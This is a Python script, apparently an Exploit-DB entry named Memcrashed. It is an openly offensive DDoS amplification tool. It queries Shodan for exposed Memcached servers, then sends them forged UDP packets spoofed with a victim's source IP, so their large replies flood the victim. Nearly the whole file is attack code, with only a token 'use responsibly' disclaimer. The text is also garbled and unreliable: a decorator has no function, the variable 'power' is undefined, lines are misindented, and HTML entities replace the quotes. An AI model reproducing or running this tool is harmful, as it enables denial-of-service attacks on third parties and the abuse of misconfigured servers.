
#-- coding: utf8 --
#!/usr/bin/python
# Download: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/44265.zip
 
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager
 
starttime=time.time()
 
@contextmanager
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:  
            yield
        finally:
            sys.stdout = old_stdout
 
class color:
    HEADER = &#039;\033[0m&#039;
 
keys = Path("./api.txt")
logo = color.HEADER + &#039;&#039;&#039;
 
   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
 
                                        Author: @037
                                        Version: 3.1
 
####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                       
&#039;&#039;&#039;
print(logo)
 
if keys.is_file():
    with open(&#039;api.txt&#039;, &#039;r&#039;) as file:
        SHODAN_API_KEY=file.readlines()
else:
    file = open(&#039;api.txt&#039;, &#039;w&#039;)
    SHODAN_API_KEY = input(&#039;[*] Please enter a valid Shodan.io API Key: &#039;)
    file.write(SHODAN_API_KEY)
    print(&#039;[~] File written: ./api.txt&#039;)
    file.close()
 
while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print(&#039;&#039;)
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith(&#039;y&#039;):
            print(&#039;&#039;)
            print(&#039;[~] Checking Shodan.io API Key: %s&#039; % SHODAN_API_KEY)
            results = api.search(&#039;product:"Memcached" port:11211&#039;)
            print(&#039;[✓] API Key Authentication: SUCCESS&#039;)
            print(&#039;[~] Number of bots: %s&#039; % results[&#039;total&#039;])
            print(&#039;&#039;)
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith(&#039;y&#039;):
                file2 = open(&#039;bots.txt&#039;, &#039;a&#039;)
                for result in results[&#039;matches&#039;]:
                    file2.write(result[&#039;ip_str&#039;] + "\n")
                print(&#039;[~] File written: ./bots.txt&#039;)
                print(&#039;&#039;)
                file2.close()
        saveme = input(&#039;[*] Would you like to use locally stored Shodan data? <Y/n>: &#039;).lower()
        if myresults.is_file():
            if saveme.startswith(&#039;y&#039;):
                ip_arrayn = []
                with open(&#039;bots.txt&#039;) as my_file:
                    for line in my_file:
                        ip_arrayn.append(line)
                ip_array = [s.rstrip() for s in ip_arrayn]
        else:
            print(&#039;&#039;)
            print(&#039;[✘] Error: No bots stored locally, bots.txt file not found!&#039;)
            print(&#039;&#039;)
        if saveme.startswith(&#039;y&#039;) or query.startswith(&#039;y&#039;):
            print(&#039;&#039;)
            target = input("[▸] Enter target IP address: ")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            print(&#039;&#039;)
            if query.startswith(&#039;y&#039;):
                iplist = input(&#039;[*] Would you like to display all the bots from Shodan? <Y/n>: &#039;).lower()
                if iplist.startswith(&#039;y&#039;):
                    print(&#039;&#039;)
                    counter= int(0)
                    for result in results[&#039;matches&#039;]:
                        host = api.host(&#039;%s&#039; % result[&#039;ip_str&#039;])
                        counter=counter+1
                        print(&#039;[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |&#039; % (counter, result[&#039;ip_str&#039;], host.get(&#039;os&#039;, &#039;n/a&#039;), host.get(&#039;org&#039;, &#039;n/a&#039;)))
                        time.sleep(2.0 - ((time.time() - starttime) % 2.0))
            if saveme.startswith(&#039;y&#039;):
                iplistlocal = input(&#039;[*] Would you like to display all the bots stored locally? <Y/n>: &#039;).lower()
                if iplistlocal.startswith(&#039;y&#039;):
                    print(&#039;&#039;)
                    counter= int(0)
                    for x in ip_array:
                        host = api.host(&#039;%s&#039; % x)
                        counter=counter+1
                        print(&#039;[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |&#039; % (counter, x, host.get(&#039;os&#039;, &#039;n/a&#039;), host.get(&#039;org&#039;, &#039;n/a&#039;)))
                        time.sleep(2.0 - ((time.time() - starttime) % 2.0))
            print(&#039;&#039;)
            engage = input(&#039;[*] Ready to engage target %s? <Y/n>: &#039; % target).lower()
            if engage.startswith(&#039;y&#039;):
                if saveme.startswith(&#039;y&#039;):
                    for i in ip_array:
                        if power>1:
                            print(&#039;[+] Sending %d forged UDP packets to: %s&#039; % (power, i))
                                send(IP(src=target, dst=&#039;%s&#039; % i) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print(&#039;[+] Sending 1 forged UDP packet to: %s&#039; % i)
                                send(IP(src=target, dst=&#039;%s&#039; % i) / UDP(dport=11211)/Raw(load=data), count=power)
                else:
                    for result in results[&#039;matches&#039;]:
                        if power>1:
                            print(&#039;[+] Sending %d forged UDP packets to: %s&#039; % (power, result[&#039;ip_str&#039;]))
                                send(IP(src=target, dst=&#039;%s&#039; % result[&#039;ip_str&#039;]) / UDP(dport=11211)/Raw(load=data), count=power)
                        elif power==1:
                            print(&#039;[+] Sending 1 forged UDP packet to: %s&#039; % result[&#039;ip_str&#039;])
                                send(IP(src=target, dst=&#039;%s&#039; % result[&#039;ip_str&#039;]) / UDP(dport=11211)/Raw(load=data), count=power)
                print(&#039;&#039;)
                print(&#039;[•] Task complete! Exiting Platform. Have a wonderful day.&#039;)
                break
            else:
                print(&#039;&#039;)
                print(&#039;[✘] Error: %s not engaged!&#039; % target)
                print(&#039;[~] Restarting Platform! Please wait.&#039;)
                print(&#039;&#039;)
        else:
            print(&#039;&#039;)
            print(&#039;[✘] Error: No bots stored locally or remotely on Shodan!&#039;)
            print(&#039;[~] Restarting Platform! Please wait.&#039;)
            print(&#039;&#039;)
 
    except shodan.APIError as e:
            print(&#039;[✘] Error: %s&#039; % e)
            option = input(&#039;[*] Would you like to change API Key? <Y/n>: &#039;).lower()
            if option.startswith(&#039;y&#039;):
                file = open(&#039;api.txt&#039;, &#039;w&#039;)
                SHODAN_API_KEY = input(&#039;[*] Please enter valid Shodan.io API Key: &#039;)
                file.write(SHODAN_API_KEY)
                print(&#039;[~] File written: ./api.txt&#039;)
                file.close()
                print(&#039;[~] Restarting Platform! Please wait.&#039;)
                print(&#039;&#039;)
            else:
                print(&#039;&#039;)
                print(&#039;[•] Exiting Platform. Have a wonderful day.&#039;)
                break

